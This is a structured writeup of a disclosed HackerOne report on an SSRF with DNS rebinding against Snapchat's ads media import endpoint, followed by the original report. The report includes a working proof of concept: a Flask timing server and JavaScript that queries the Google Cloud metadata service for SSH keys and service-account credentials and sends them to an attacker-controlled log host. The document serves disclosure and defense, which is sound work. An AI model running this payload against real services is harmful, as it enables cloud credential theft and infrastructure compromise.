# Server-Side Request Forgery (SSRF) via JavaScript enables Google Metadata Service Exfiltration

## Metadata
- **Source:** HackerOne
- **Report:** 530974 | https://hackerone.com/reports/530974
- **Submitted:** 2019-04-08
- **Reporter:** nahamsec
- **Program:** Snapchat (HackerOne)
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Server-Side Request Forgery (SSRF), Metadata Service Exposure, DNS Rebinding, Credential Exposure
- **CVEs:** None
- **Category:** web-api

## Summary
The creative library import function at `/api/v1/media/import` on ads.snapchat.com performs unsanitized server-side fetches of user-supplied URLs. An attacker can exploit DNS rebinding to redirect the server's request from an attacker-controlled domain to the Google Cloud metadata service (169.254.169.254), exfiltrating sensitive data including SSH keys, service account credentials, and instance hostnames.

## Attack scenario
1. Attacker authenticates to business.snapchat.com and navigates to creative library import function
2. Attacker hosts malicious JavaScript on their domain that performs timing attacks and queries metadata endpoints
3. Attacker initiates `/api/v1/media/import` request with URL pointing to attacker-controlled domain hosting the malicious payload
4. Attacker performs DNS rebinding: initially resolves domain to attacker's IP, then changes DNS to point to 169.254.169.254 (Google metadata service)
5. Server-side fetcher retrieves the JavaScript from attacker's domain, then subsequent requests resolve to metadata service due to DNS change
6. Malicious JavaScript executes with server-side context, queries metadata endpoints with required headers, and exfiltrates SSH keys and credentials

## Root cause
The `/api/v1/media/import` endpoint performs server-side URL fetching without proper validation, SSRF protections, or metadata service blocking. The implementation likely uses a simple HTTP client that respects DNS resolution changes during request processing, enabling DNS rebinding attacks. Additionally, the server likely accepts and executes JavaScript content, or the fetched content is processed in a context where JavaScript execution is possible.

## Attacker mindset
An authenticated attacker seeks to pivot from account compromise to infrastructure compromise by leveraging the import function's SSRF vulnerability. The attacker uses DNS rebinding (a sophisticated timing-based technique) to bypass initial domain validation by switching the domain's IP address mid-request. The goal is to reach the cloud metadata service which is deliberately restricted from external access but accessible from instance metadata queries, allowing credential theft and lateral movement within the cloud infrastructure.

## Defensive takeaways
- Implement strict URL validation and whitelist allowed domains; block private IP ranges (169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 127.0.0.0/8) and metadata service addresses
- Use separate DNS resolution and request execution: resolve DNS once, validate the IP, then execute the request without re-resolving
- Disable or restrict HTTP headers like 'X-Google-Metadata-Request' and 'X-AWS-EC2-Metadata-Token' in server-side request libraries
- Implement SSRF-specific protections: bind to source IP before DNS resolution, use allowlist-only outbound connections, implement timeouts
- Never execute untrusted JavaScript on the server side; treat fetched content as data, not executable code
- Add network-level protections: prevent instances from accessing metadata services via host-level firewall rules where possible
- Implement request/response logging and monitoring for suspicious patterns (metadata service queries, private IP access attempts)
- Use a dedicated SSRF-safe HTTP library or proxy service that handles DNS rebinding protection automatically

## Variant hunting
Scan for other import/fetch/proxy endpoints across Snapchat domains that accept user-supplied URLs
Test webhook or callback functionality in ad delivery, analytics, or webhook systems for similar SSRF patterns
Examine image processing pipelines, thumbnail generation, or CDN purge endpoints for unsanitized URL handling
Check for similar SSRF vectors in other Snapchat products: Snap Ads Manager, Snap Publisher, business tools
Investigate if similar DNS rebinding attacks can target AWS metadata services (169.254.169.254) or Azure metadata endpoints
Test whether other HTTP headers (Authorization, X-Forwarded-For) can be injected to access restricted metadata endpoints
Search for similar endpoints in development/staging environments which may have weaker protections

## MITRE ATT&CK
- T1190
- T1538
- T1552.005
- T1021.005

## Notes
This is a sophisticated, multi-stage attack combining SSRF with DNS rebinding to achieve credential exfiltration. The attacker's use of timing attacks (the sleep/loop mechanism) is crucial to ensure the DNS rebinding happens during the server's fetch operation. The redaction of actual credentials and hostnames in the writeup indicates this was a genuine high-impact vulnerability affecting production infrastructure. The fact that the metadata service requires the 'X-Google-Metadata-Request' header and the attacker properly sets it suggests awareness of cloud security mechanisms. This vulnerability likely affected all Snapchat business users who used the creative import feature, making it a high-severity finding with broad impact.

## Full report
<details><summary>Expand</summary>

Hey there, 
I was looking at your ads site with @daeken, we found some weird behavior in the import function of the creative app. Here are the steps:

#POC
- Login to https://business.snapchat.com/
- Go to creative library -> New Creative 
- Under "Topsnap Media", click on "Create"
- Click on any of the templates and load it
- Click on one of the images in the template -> Replace -> Import
- _This is where the SSRF exists_. Where you fetch images for your creative (`/api/v1/media/import`)
-  Run this somewhere publicly accessible:

```
from flask import Flask, request
from flask_cors import CORS
from time import sleep

app = Flask(__name__)
CORS(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route("/")
def helloWorld():
        sleep(3)
        return 'hi!'

@app.route('/log')
def log():
        print request.args['msg']
        return ''

app.run(host='0.0.0.0')
```

- Put this on another domain you control. Change demon.██████████ to the host where you put this html file, and change ssh.████ to the host you're running the timing script (above) on.

```
<script>
var logTimeServer = 'ssh.█████';
var attackServer = 'demon.██████';

function log(data) {
    var sreq = new XMLHttpRequest();
    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);
    sreq.send();
}

function get(url) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.setRequestHeader('X-Google-Metadata-Request', 'True');
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        log(err);
    }
    return null;
}

log('Triggered in ' + window.location.href);

for(var i = 0; i < 60; ++i) {
    log('Loop ' + i);
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + logTimeServer + ':5000/', false);
    req.send();
}
log('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));
log('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));
log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
</script>
```

- Now hit `/api/v1/media/import` on `ads.snapchat.com`, with the URL parameter http://demon.███████/ssrf.html (or wherever you run it)
- Immediately after requesting `ssrf.html`, switch the DNS on the domain to point to 169.254.169.254, and wait 3 minutes.  ssrf.html needs to be running on port 80, that way when the DNS changes, it starts talking to the metadata service.

## Impact

#SSH Keys:

```
SSH Keys: "██████"
```

#Hostname: 
`█████████`

</details>

---
*Analysed by Claude on 2026-05-11*
